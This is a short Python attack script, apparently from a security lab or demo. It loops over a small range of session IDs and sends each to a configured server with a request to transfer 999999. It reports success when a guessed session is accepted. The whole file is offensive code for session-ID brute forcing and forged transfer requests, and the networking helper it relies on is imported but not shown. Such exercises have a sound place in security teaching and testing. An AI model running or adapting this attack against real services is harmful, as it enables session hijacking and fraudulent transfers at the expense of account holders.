import argparse
from config import DEFAULT_HOST
from utils.attacker_runner import run_tcp_attack

parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Port to connect to")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

for sid in range(123450, 123460):
    plain_text = f"session_id={sid}&action=transfer&amount=999999"
    print(f"\n[Attacker] Trying session_id={sid}")

    response = run_tcp_attack(
        host=server_host,
        port=server_port,
        plain_text=plain_text,
        payload=plain_text,
        verbose=False
    )

    if "✅" in response:
        print(f"\n[Attacker] Valid session ID found! Attack succeeded.")
        print(f"   Response: {response}")
